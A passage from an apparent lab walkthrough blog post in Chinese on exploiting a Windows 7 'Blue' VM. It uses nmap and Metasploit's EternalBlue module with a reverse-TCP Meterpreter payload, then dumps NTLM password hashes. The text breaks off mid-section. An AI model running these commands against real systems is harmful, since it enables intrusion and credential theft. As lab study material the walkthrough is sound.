<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Privilege Escalation | HackThe4O4</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="Capstone - Privilege EscalationResources: Capstone VMs Old Capstone Videos Windows Privilege Escalation for Beginners Linux Privilege Escalation for Beginners **https:&#x2F;&#x2F;cdn.fs.teachablecdn.com&#x2F;XyWGk3B">
<meta property="og:type" content="article">
<meta property="og:title" content="Privilege Escalation">
<meta property="og:url" content="https://no-flag.com/2024/12/21/Capstone-Privilege/index.html">
<meta property="og:site_name" content="HackThe4O4">
<meta property="og:description" content="Capstone - Privilege EscalationResources: Capstone VMs Old Capstone Videos Windows Privilege Escalation for Beginners Linux Privilege Escalation for Beginners **https:&#x2F;&#x2F;cdn.fs.teachablecdn.com&#x2F;XyWGk3B">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_1.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_2.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_3.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_4.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_5.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_6.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_7.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_8.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_9.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_10.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_11.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_12.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_13.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_14.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_15.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_16.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_17.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_18.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_19.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_20.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_21.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_22.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_23.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_24.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_25.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_26.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_27.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_28.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_29.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_30.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_31.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_32.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_33.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_34.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_35.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_36.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_37.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_38.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_39.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_40.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_41.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_42.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_43.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_44.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_45.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_46.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_47.png">
<meta property="og:image" content="https://no-flag.com/img/privilege_Untitled_48.png">
<meta property="article:published_time" content="2024-12-21T12:32:07.077Z">
<meta property="article:modified_time" content="2024-03-02T17:20:20.596Z">
<meta property="article:author" content="Noflag">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://no-flag.com/img/privilege_Untitled.png">
  
    <link rel="alternative" href="/atom.xml" title="HackThe4O4" type="application/atom+xml">
  
  
    <link rel="icon" href="/img/cat.jpg">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  

  
<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>

  
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>


  


<meta name="generator" content="Hexo 7.3.0"></head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="/img/mela.gif" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/"></a></h1>
		</hgroup>

		

		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/2024/12/21/hello-world/">About Me</a></li>
				        
							<li><a href="/archives">All articles</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
						</div>
					</nav>
				</section>
				
				
				
				

				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide"></h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="/img/mela.gif" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author"></h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/2024/12/21/hello-world/">About Me</a></li>
		        
					<li><a href="/archives">All articles</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap"><article id="privilege-Capstone-Privilege" class="article article-type-privilege" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/Capstone-Privilege/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.077Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      Privilege Escalation
      
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
        

        
        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Capstone-Privilege-Escalation"><a href="#Capstone-Privilege-Escalation" class="headerlink" title="Capstone - Privilege Escalation"></a>Capstone - Privilege Escalation</h1><p>Resources:</p>
<p><a target="_blank" rel="noopener" href="https://drive.google.com/drive/folders/1xJy4ozXaahXvjbgTeJVWyY-eUGIKgCj1?usp=sharing"><strong>Capstone VMs</strong></a></p>
<p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=JZN3JhoAdWo&list=PLLKT__MCUeiyxF54dBIkzEXT7h8NgqQUB&ab_channel=TheCyberMentor">Old Capstone Videos</a></p>
<p><a target="_blank" rel="noopener" href="https://academy.tcm-sec.com/p/windows-privilege-escalation-for-beginners">Windows Privilege Escalation for Beginners</a></p>
<p><a target="_blank" rel="noopener" href="https://academy.tcm-sec.com/p/linux-privilege-escalation">Linux Privilege Escalation for Beginners</a></p>
<p><a target="_blank" rel="noopener" href="https://cdn.fs.teachablecdn.com/XyWGk3BwRMWhth526GV0">**https://cdn.fs.teachablecdn.com/XyWGk3BwRMWhth526GV0</a>** </p>
<hr>
<p>權限提升 - 提升原使用者權限</p>
<h3 id="Set-up-Blue-VM"><a href="#Set-up-Blue-VM" class="headerlink" title="Set up Blue VM"></a>Set up Blue VM</h3><ul>
<li>user - Password123!</li>
<li>administrator - Password456!</li>
<li>win7</li>
<li>192.168.19.139</li>
</ul>
<p>確認kali可以連線到這台機器</p>
<h3 id="Walkthrough-Blue"><a href="#Walkthrough-Blue" class="headerlink" title="Walkthrough - Blue"></a><strong>Walkthrough - Blue</strong></h3><p>按照慣例先掃描目標機器的服務</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **nmap -T4 -A -p- 192.168.19.139**</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-14 21:11 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.19.139</span><br><span class="line">Host is up (0.0013s latency).</span><br><span class="line">Not shown: 65526 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">**135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">49152/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49156/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49157/tcp open  msrpc        Microsoft Windows RPC**</span><br><span class="line">MAC Address: 00:0C:29:B9:88:D6 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: **Microsoft Windows 7|2008|8.1**</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1</span><br><span class="line">OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">**Service Info: Host: WIN-845Q99OO4PP;** OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| **smb-os-discovery:** </span><br><span class="line">|   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_7::sp1</span><br><span class="line">|   Computer name: WIN-845Q99OO4PP</span><br><span class="line">|   NetBIOS computer name: WIN-845Q99OO4PP\x00</span><br><span class="line">|   Workgroup: WORKGROUP\x00</span><br><span class="line">|_  System <span class="keyword">time</span>: 2024-02-14T21:12:23-05:00</span><br><span class="line">| **smb2-security-mode:** </span><br><span class="line">|   2:1:0: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| **smb-security-mode:** </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2024-02-15T02:12:23</span><br><span class="line">|_  start_date: 2024-02-14T02:35:29</span><br><span class="line">|_nbstat: NetBIOS name: WIN-845Q99OO4PP, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:b9:88:d6 (VMware)</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.28 ms 192.168.19.139</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 86.12 seconds</span><br></pre></td></tr></table></figure>

<p>從掃描結果看到不少重要資訊</p>
<ul>
<li><strong>139&#x2F;tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</strong></li>
<li><strong>445&#x2F;tcp   open  microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)</strong></li>
<li><strong>Service Info: Host: WIN-845Q99OO4PP</strong></li>
<li>Running: <strong>Microsoft Windows 7|2008|8.1</strong></li>
</ul>
<p>到google搜尋 <strong>microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds</strong> 相關版本漏洞</p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/47176">https://www.exploit-db.com/exploits/47176</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/AnikateSawhney/Pwning_Blue_From_HTB_Without_Metasploit">https://github.com/AnikateSawhney/Pwning_Blue_From_HTB_Without_Metasploit</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/3ndG4me/AutoBlue-MS17-010">https://github.com/3ndG4me/AutoBlue-MS17-010</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/worawit/MS17-010">https://github.com/worawit/MS17-010</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/d4t4s3c/Win7Blue">https://github.com/d4t4s3c/Win7Blue</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://gist.github.com/05t3/7d5925e6a4585abe2a48cc4a978aea87">https://gist.github.com/05t3/7d5925e6a4585abe2a48cc4a978aea87</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/3ndG4me/AutoBlue-MS17-010/blob/master/eternalblue_exploit10.py">https://github.com/3ndG4me/AutoBlue-MS17-010/blob/master/eternalblue_exploit10.py</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/Telefonica/Eternalblue-Doublepulsar-Metasploit/blob/master/eternalblue_doublepulsar.rb">https://github.com/Telefonica/Eternalblue-Doublepulsar-Metasploit/blob/master/eternalblue_doublepulsar.rb</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/42315"><strong>https://www.exploit-db.com/exploits/42315</strong></a></p>
<ul>
<li>通常主要以可以進行遠程控制的payload為主</li>
<li>提到EternalBlue，開啟MSF搜尋一下exploit</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; search eternalblue</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                      Disclosure Date  Rank     Check  Description</span></span><br><span class="line">   -  ----                                      ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span><br><span class="line">   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br><span class="line">   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br><span class="line">   **3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection**</span><br><span class="line">   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution</span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>auxiliary modules &gt; check、attack、scanning…</strong></li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">msf6 &gt; **use 3**</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; **options** </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/smb/smb_ms17_010):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting                     Required  Description</span><br><span class="line">   ----         ---------------                     --------  -----------</span><br><span class="line">   CHECK_ARCH   <span class="literal">true</span>                                no        Check <span class="keyword">for</span> architecture on vulnerable hosts</span><br><span class="line">   CHECK_DOPU   <span class="literal">true</span>                                no        Check <span class="keyword">for</span> DOUBLEPULSAR on vulnerable hosts</span><br><span class="line">   CHECK_PIPE   <span class="literal">false</span>                               no        Check <span class="keyword">for</span> named pipe on vulnerable hosts</span><br><span class="line">   NAMED_PIPES  /usr/share/metasploit-framework/da  <span class="built_in">yes</span>       List of named pipes to check</span><br><span class="line">                ta/wordlists/named_pipes.txt</span><br><span class="line">   RHOSTS                                           <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using</span><br><span class="line">                                                              -metasploit/basics/using-metasploit.html</span><br><span class="line">   RPORT        445                                 <span class="built_in">yes</span>       The SMB service port (TCP)</span><br><span class="line">   SMBDomain    .                                   no        The Windows domain to use <span class="keyword">for</span> authentication</span><br><span class="line">   SMBPass                                          no        The password <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBUser                                          no        The username to authenticate as</span><br><span class="line">   THREADS      1                                   <span class="built_in">yes</span>       The number of concurrent threads (max one per host)</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; **<span class="built_in">set</span> rhost 192.168.19.139**</span><br><span class="line">rhost =&gt; 192.168.19.139</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; **run**</span><br><span class="line"></span><br><span class="line">[+] 192.168.19.139:445    - Host is likely **VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)**</span><br><span class="line">[*] 192.168.19.139:445    - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
<ul>
<li>可以確認目標機器是有RCE漏洞的，對它進行利用</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; **search eternalblue**</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                      Disclosure Date  Rank     Check  Description</span></span><br><span class="line">   -  ----                                      ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span><br><span class="line">   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br><span class="line">   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br><span class="line">   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection</span><br><span class="line">   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution</span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; **use 0**</span><br><span class="line">[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS                          <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basic</span><br><span class="line">                                             s/using-metasploit.html</span><br><span class="line">   RPORT          445              <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">   SMBDomain                       no        (Optional) The Windows domain to use <span class="keyword">for</span> authentication. Only affects Windows S</span><br><span class="line">                                             erver 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.</span><br><span class="line">   SMBPass                         no        (Optional) The password <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class="line">   VERIFY_ARCH    <span class="literal">true</span>             <span class="built_in">yes</span>       Check <span class="keyword">if</span> remote architecture matches exploit Target. Only affects Windows Serve</span><br><span class="line">                                             r 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.</span><br><span class="line">   VERIFY_TARGET  <span class="literal">true</span>             <span class="built_in">yes</span>       Check <span class="keyword">if</span> remote OS matches exploit Target. Only affects Windows Server 2008 R2,</span><br><span class="line">                                              Windows 7, Windows Embedded Standard 7 target machines.</span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           <span class="built_in">yes</span>       Exit technique (Accepted: <span class="string">&#x27;&#x27;</span>, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.19.130   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic Target</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; **<span class="built_in">set</span> rhosts 192.168.19.139**</span><br><span class="line">rhosts =&gt; 192.168.19.139</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; **check** </span><br><span class="line"></span><br><span class="line">[*] 192.168.19.139:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] 192.168.19.139:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 192.168.19.139:445    - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[+] 192.168.19.139:445 - The target is vulnerable.</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; **<span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp**</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; **options** </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS         192.168.19.139   <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basic</span><br><span class="line">                                             s/using-metasploit.html</span><br><span class="line">   RPORT          445              <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">   SMBDomain                       no        (Optional) The Windows domain to use <span class="keyword">for</span> authentication. Only affects Windows S</span><br><span class="line">                                             erver 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.</span><br><span class="line">   SMBPass                         no        (Optional) The password <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class="line">   VERIFY_ARCH    <span class="literal">true</span>             <span class="built_in">yes</span>       Check <span class="keyword">if</span> remote architecture matches exploit Target. Only affects Windows Serve</span><br><span class="line">                                             r 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.</span><br><span class="line">   VERIFY_TARGET  <span class="literal">true</span>             <span class="built_in">yes</span>       Check <span class="keyword">if</span> remote OS matches exploit Target. Only affects Windows Server 2008 R2,</span><br><span class="line">                                              Windows 7, Windows Embedded Standard 7 target machines.</span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           <span class="built_in">yes</span>       Exit technique (Accepted: <span class="string">&#x27;&#x27;</span>, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.19.130   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic Target</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; **<span class="built_in">set</span> lhost eth0  <span class="comment">#設定IP也可以寫網卡名稱**</span></span><br><span class="line">lhost =&gt; 192.168.19.130</span><br></pre></td></tr></table></figure>
<ul>
<li>通過check也確認了目標機器的漏洞</li>
<li>成功利用該漏洞進行遠程登入</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; **run**</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.19.130:4444 </span><br><span class="line">[*] 192.168.19.139:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] 192.168.19.139:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 192.168.19.139:445    - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[+] 192.168.19.139:445 - The target is vulnerable.</span><br><span class="line">[*] 192.168.19.139:445 - Connecting to target <span class="keyword">for</span> exploitation.</span><br><span class="line">[+] 192.168.19.139:445 - Connection established <span class="keyword">for</span> exploitation.</span><br><span class="line">[+] 192.168.19.139:445 - Target OS selected valid <span class="keyword">for</span> OS indicated by SMB reply</span><br><span class="line">[*] 192.168.19.139:445 - CORE raw buffer dump (38 bytes)</span><br><span class="line">[*] 192.168.19.139:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima</span><br><span class="line">[*] 192.168.19.139:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service </span><br><span class="line">[*] 192.168.19.139:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          </span><br><span class="line">[+] 192.168.19.139:445 - Target <span class="built_in">arch</span> selected valid <span class="keyword">for</span> <span class="built_in">arch</span> indicated by DCE/RPC reply</span><br><span class="line">[*] 192.168.19.139:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 192.168.19.139:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 192.168.19.139:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 192.168.19.139:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 192.168.19.139:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 192.168.19.139:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 192.168.19.139:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 192.168.19.139:445 - Receiving response from exploit packet</span><br><span class="line">[+] 192.168.19.139:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 192.168.19.139:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 192.168.19.139:445 - Triggering free of corrupted buffer.</span><br><span class="line">[*] Sending stage (201798 bytes) to 192.168.19.139</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.19.130:4444 -&gt; 192.168.19.139:49162) at 2024-02-14 21:39:34 -0500</span><br><span class="line">[+] 192.168.19.139:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 192.168.19.139:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 192.168.19.139:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line"></span><br><span class="line">meterpreter &gt; **hashdump** </span><br><span class="line">**Administrator:500:aad3b435b51404eeaad3b435b51404ee:58f5081696f366cdc72491a2c4996bd5:::**</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:f580a1940b1f6759fbdd9f5c482ccdbb:::</span><br><span class="line">**user:1000:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::**</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>  換個攻擊方式，使用以下payload試試</p>
